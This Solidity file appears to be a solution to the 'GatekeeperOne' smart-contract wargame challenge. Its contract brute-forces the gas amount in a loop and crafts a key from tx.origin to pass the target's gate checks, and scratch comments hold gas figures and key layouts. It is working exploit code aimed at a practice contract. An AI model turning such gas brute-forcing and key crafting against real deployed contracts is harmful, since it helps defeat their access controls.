// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract HackGatekeeperOne {
    event Log(bool entered, uint gas);

    function enter(IGatekeeperOne _target, uint _gas, bytes8 _key, uint deltaGas) external {

        // uint deltaGas = 250;
        // 82303 // 250
        // 0x0000000a0000ddc4

        // 0x000000000000AAAA
        // 0x0000 000A 0000 AAAA // 0x0000000A0000AAAA
        // 0x0000 000A 0000 ddc4 // 0x0000000A0000ddc4
        // 0x ddc4

        // bytes8 _key = bytes8(abi.encodePacked(bytes2(0), bytes2(0x000A), bytes2(0), bytes2(uint16(uint160(tx.origin)))));

        bool success;
        uint resGas;
        for (uint i = _gas - deltaGas; i <= _gas + deltaGas; ++i) {
            (bool res, ) = address(_target).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", _key));
            if (res) {
                resGas = i;
                success = true;
                break;
            }
        }

        if (success) {
            emit Log(true, resGas);
        } else {
            emit Log(false, resGas);
        }

        // _target.enter{gas: _gas}(0xAAAAAAAAAAAAAAAA); // 84903 84803-85003 // [82333] // 164243 // [123288]
    }

    function getHash() external view returns (bytes8) {
        return bytes8(abi.encodePacked(bytes2(0), bytes2(0x000A), bytes2(0), bytes2(uint16(uint160(tx.origin)))));
        // return bytes2(uint16(uint160(tx.origin)));
    }
}